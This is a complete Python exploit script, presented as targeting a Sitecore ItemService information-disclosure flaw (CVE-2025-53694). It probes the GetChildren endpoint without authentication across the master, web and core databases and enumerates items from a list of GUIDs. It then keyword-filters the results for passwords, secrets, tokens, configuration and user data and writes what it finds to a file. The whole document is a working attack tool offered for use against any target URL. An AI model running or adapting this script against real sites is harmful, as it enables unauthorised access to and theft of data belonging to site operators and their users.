#!/usr/bin/env python3

import requests
import json
import sys
import argparse
import urllib3
from urllib.parse import urljoin, urlparse
import uuid
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SitecoreInfoDisclosure:
    def __init__(self, target_url, timeout=10, verify_ssl=False):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.common_guids = [
            '110D559F-DEA5-42EA-9C1C-8A5DF7E70EF9',
            '{11111111-1111-1111-1111-111111111111}',
            '{0DE95AE4-41AB-4D01-9EB0-67441B7C2450}',
            '{FE5D7FDF-89C0-4D99-9AA3-B5FBD009C9F3}',
            '{3C1715FE-6A13-4FCF-845F-DE308BA9741D}',
            '{A87A00B1-E6DB-45AB-8B54-636FEC3B5523}',
            '{B6F7EEB4-E8D7-476F-8936-5ACE6A76F20B}',
            '{C6576836-910C-4A3D-BA03-C277DBD3B827}',
            '{1CE3B36C-9B0C-4EB5-A996-BFCB4EAA5287}',
            '{04DAD0FD-DB66-4070-881F-17264CA257E1}'
        ]
        
        self.databases = ['master', 'web', 'core']

    def check_vulnerability(self):
        endpoint = '/sitecore/shell/api/sitecore/ItemService/GetChildren'
        test_guid = self.common_guids[0]
        
        for database in self.databases:
            url = urljoin(self.target_url, endpoint)
            params = {
                'id': test_guid,
                'database': database
            }
            
            try:
                response = self.session.get(
                    url, 
                    params=params, 
                    timeout=self.timeout, 
                    verify=self.verify_ssl
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, list) and len(data) > 0:
                            return True, database, data
                        elif isinstance(data, dict) and 'result' in data:
                            return True, database, data
                    except json.JSONDecodeError:
                        if 'sitecore' in response.text.lower() or 'item' in response.text.lower():
                            return True, database, response.text
                            
            except requests.RequestException:
                continue
                
        return False, None, None

    def enumerate_items(self, database='master', max_items=50):
        endpoint = '/sitecore/shell/api/sitecore/ItemService/GetChildren'
        discovered_items = []
        processed_guids = set()
        
        print(f"[*] Enumerating items in database: {database}")
        
        for guid in self.common_guids[:10]:
            if guid in processed_guids:
                continue
                
            processed_guids.add(guid)
            url = urljoin(self.target_url, endpoint)
            params = {
                'id': guid,
                'database': database
            }
            
            try:
                response = self.session.get(
                    url, 
                    params=params, 
                    timeout=self.timeout, 
                    verify=self.verify_ssl
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, dict):
                                    discovered_items.append(item)
                                    if 'ID' in item and item['ID'] not in processed_guids:
                                        processed_guids.add(item['ID'])
                                        
                        elif isinstance(data, dict):
                            discovered_items.append(data)
                            
                    except json.JSONDecodeError:
                        if len(response.text) > 0:
                            discovered_items.append({
                                'guid': guid,
                                'raw_response': response.text[:500]
                            })
                            
                if len(discovered_items) >= max_items:
                    break
                    
            except requests.RequestException as e:
                print(f"[!] Error querying {guid}: {e}")
                continue
                
            time.sleep(0.1)
            
        return discovered_items

    def extract_sensitive_data(self, items):
        sensitive_data = {
            'credentials': [],
            'configurations': [],
            'paths': [],
            'database_info': [],
            'user_data': []
        }
        
        for item in items:
            if isinstance(item, dict):
                item_str = json.dumps(item).lower()
                
                if any(keyword in item_str for keyword in ['password', 'secret', 'key', 'token']):
                    sensitive_data['credentials'].append(item)
                    
                if any(keyword in item_str for keyword in ['config', 'setting', 'connection']):
                    sensitive_data['configurations'].append(item)
                    
                if any(keyword in item_str for keyword in ['path', 'directory', 'file']):
                    sensitive_data['paths'].append(item)
                    
                if any(keyword in item_str for keyword in ['user', 'admin', 'account']):
                    sensitive_data['user_data'].append(item)
                    
                if any(keyword in item_str for keyword in ['database', 'sql', 'connection']):
                    sensitive_data['database_info'].append(item)
                    
        return sensitive_data

    def exploit(self):
        print(f"[*] Testing CVE-2025-53694 against: {self.target_url}")
        print("[*] Sitecore ItemService Information Disclosure")
        
        vulnerable, database, initial_data = self.check_vulnerability()
        
        if not vulnerable:
            print("[-] Target does not appear vulnerable to CVE-2025-53694")
            return False
            
        print(f"[+] Target is VULNERABLE to CVE-2025-53694!")
        print(f"[+] Accessible database: {database}")
        
        if initial_data:
            print(f"[+] Initial data retrieved: {len(str(initial_data))} characters")
            
        all_items = []
        for db in self.databases:
            print(f"\n[*] Enumerating database: {db}")
            items = self.enumerate_items(db)
            if items:
                print(f"[+] Found {len(items)} items in {db} database")
                all_items.extend(items)
            else:
                print(f"[-] No items found in {db} database")
                
        if all_items:
            print(f"\n[+] Total items discovered: {len(all_items)}")
            sensitive = self.extract_sensitive_data(all_items)
            
            print("\n[*] Sensitive data analysis:")
            for category, data in sensitive.items():
                if data:
                    print(f"  - {category.title()}: {len(data)} items")
                    
            return {
                'vulnerable': True,
                'database': database,
                'total_items': len(all_items),
                'sensitive_data': sensitive,
                'raw_items': all_items
            }
        else:
            print("[-] No items could be enumerated")
            return {'vulnerable': True, 'database': database, 'total_items': 0}

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-53694 Sitecore Information Disclosure Exploit')
    parser.add_argument('target', help='Target Sitecore URL (e.g., https://target.com)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    parser.add_argument('--output', help='Output file for results (JSON format)')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
        
    exploit = SitecoreInfoDisclosure(
        target_url=args.target,
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify
    )
    
    try:
        result = exploit.exploit()
        
        if args.output and result:
            with open(args.output, 'w') as f:
                json.dump(result, f, indent=2, default=str)
            print(f"\n[+] Results saved to: {args.output}")
            
        return 0 if result and result.get('vulnerable') else 1
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 1
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
